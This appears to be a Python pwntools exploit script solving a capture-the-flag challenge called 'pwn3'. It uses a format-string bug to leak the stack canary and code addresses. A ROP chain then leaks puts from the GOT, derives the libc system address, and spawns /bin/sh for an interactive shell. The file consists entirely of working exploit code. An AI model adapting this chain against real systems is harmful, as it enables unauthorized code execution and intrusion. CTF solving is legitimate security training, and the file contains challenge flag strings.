from pwn import *

p = process("./pwn3")
#p = remote("hax1.allesctf.net", 9102)

FORMATSTRING = "|".join(["%lx" for _ in xrange(0,38)])
FORMATSTRING2 = "|".join(["%p" for _ in xrange(0,20)])

SYSTEM_LIBC_OFFSET = 0x00000000000554e0
PUTS_LIBC_OFFSET = 0x0000000000087490

p.recvuntil("Enter the password of stage 2:")

p.sendline("CSCG{THIS_IS_TEST_FLAG}")
#p.sendline("CSCG{NOW_GET_VOLDEMORT}")

p.recvuntil("Enter your witch name:")

p.sendline(FORMATSTRING + "|" + FORMATSTRING2)


LEAKS = p.recvuntil("enter your magic spell:").split("|")
CANARY = int(LEAKS[-(4+16)], 16)
MAIN = int(LEAKS[-(2+16)], 16)
log.info("Leaked MAIN value 0x{:x}".format(MAIN))
log.info("Leaked CANARY value 0x{:x}".format(CANARY))

GOT_PUTS = MAIN + 0x20120a
POP_RDI_RET = MAIN + 0x75

PRINTF = MAIN - 0xe2
BASE = int (LEAKS[-6], 16) - 0x108 + 0x40
AAAAAAAAA = MAIN - 0xc6

log.info("Leaked test Start value 0x{:x}".format(int (LEAKS[-6], 16)))


log.info("Leaked GOT_PUTS value 0x{:x}".format(GOT_PUTS))
log.info("Leaked POP_RDI_RET Start value 0x{:x}".format(POP_RDI_RET))
log.info("Leaked PRINTF Start value 0x{:x}".format(PRINTF))
log.info("Leaked BASE Start value 0x{:x}".format(BASE))
log.info("Leaked AAAAAAAAA Start value 0x{:x}".format(AAAAAAAAA))

RET = MAIN-0x200

log.info("Leaked Return value 0x{:x}".format(RET))

PADDING1 = "A"*cyclic_find("cnaa")
p.sendline("Expelliarmus\x00" + PADDING1 + p64(CANARY) + p64(BASE) + p64(RET) + p64(POP_RDI_RET) + p64(GOT_PUTS) + p64(RET) + p64(PRINTF) + p64(CANARY) + p64(RET) + p64(AAAAAAAAA))

p.recvuntil("~ Protego!")
p.recvline()

LEAKS2 = p.recvuntil("enter your magic spell:\n").replace(" enter your magic spell:\n","")
LEAKS2 += '\x00\x00'
PUTS_LIBC = u64(LEAKS2)
SYSTEM_LIBC = PUTS_LIBC - PUTS_LIBC_OFFSET + SYSTEM_LIBC_OFFSET

log.info("Leaked PUTS_LIBC Start value 0x{:x}".format(PUTS_LIBC))
log.info("Leaked SYSTEM_LIBC Start value 0x{:x}".format(SYSTEM_LIBC))

raw_input("attach gdb")

p.sendline("Expelliarmus\x00" + PADDING1 + p64(CANARY) + p64(BASE) + p64(RET) + p64(POP_RDI_RET) + p64(BASE + 0x38) + p64(SYSTEM_LIBC) + p64(PRINTF) + "/bin/sh")

p.interactive()